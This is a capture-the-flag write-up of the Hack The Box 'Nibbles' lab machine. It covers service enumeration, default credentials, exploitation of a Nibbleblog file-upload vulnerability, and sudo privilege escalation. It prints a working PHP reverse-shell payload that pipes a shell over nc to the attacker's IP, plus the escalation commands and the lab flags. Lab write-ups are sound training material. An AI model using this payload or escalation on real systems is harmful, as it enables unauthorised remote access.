# HTB: Nibbles

## Engagement Overview

**Target:** Nibbles   
**Box IP:** 10.10.10.75   
**Local IP:** 10.10.14.7  
**Date:** 07-20-2025  

---

### Objectives

- Enumerate services to discover web applications and credentials.
- Exploit an arbitrary file upload vulnerability in Nibbleblog.
- Escalate privileges via misconfigured sudo permissions to obtain root access.

---

## Service Enumeration

### Nmap Results

```
nmap -sV -sC -A 10.10.10.75
```
```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

- Web server on port 80 hosted a Nibbleblog CMS.
- Detected Nibbleblog version: **v4.0.3 Codename: Coffee** (2014-04-01)

### Gobuster Results

```
gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 20
```
Key findings:
- `/admin.php` – Admin login page
- `/content/`, `/plugins/`, `/themes/`, `/languages/` – Exposed directories
- `/README`, `/LICENSE.txt`, `/COPYRIGHT.txt` – Info disclosure
- `/install.php`, `/update.php` – Should have been removed after setup

---

## Methodologies

### Initial Access – Arbitrary File Upload

**Vulnerability:**  
- CVE-2015-6967 – Authenticated file upload vulnerability in Nibbleblog 4.0.3  
  [https://www.cve.org/CVERecord?id=CVE-2015-6967](https://www.cve.org/CVERecord?id=CVE-2015-6967)

**Credentials:**
```
Username: admin
Password: nibbles
```

**Payload:**
```php
<?php system("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.7 5454 > /tmp/f"); ?>
```

**Exploit:**
```bash
python3 exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload shell.php
```

**Result:**
- Reverse shell obtained on port 5454 as web user.

---

## Privilege Escalation

```bash
sudo -l
```

Output:
```
User nibbler may run the following command without password:
(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Initial attempt to inject reverse shell into `monitor.sh` failed due to syntax issues.

**Working escalation method:**
```bash
echo "bash -i" > monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

**Result:**
- Root shell obtained.
- Accessed `/root/root.txt`.

---

## House Cleaning

- No cleanup required; no persistence or destructive changes made.

---

## Post-Exploitation

### Credentials & Flags
- `user.txt`: `caafc6db3f2edcfadb67939c0bfc8be7`  
- `root.txt`: `3326a0f327a5b3466a5ca7016471485e`

---

## Tools Utilized

* `nmap`, `gobuster`, `netcat`
* `exploit.py`, `shell.php` (reverse shell payload)
* Python3, Bash

---

## Key Takeaways

* Old CMS versions often contain known exploits like CVE-2015-6967.
* Default credentials (`admin:nibbles`) still work — always try basic credential stuffing.
* Misconfigured `sudo` scripts can offer root access — even a writable `.sh` file is a goldmine.
* If a reverse shell payload fails, test simpler command injection like `bash -i` to reduce syntax errors.
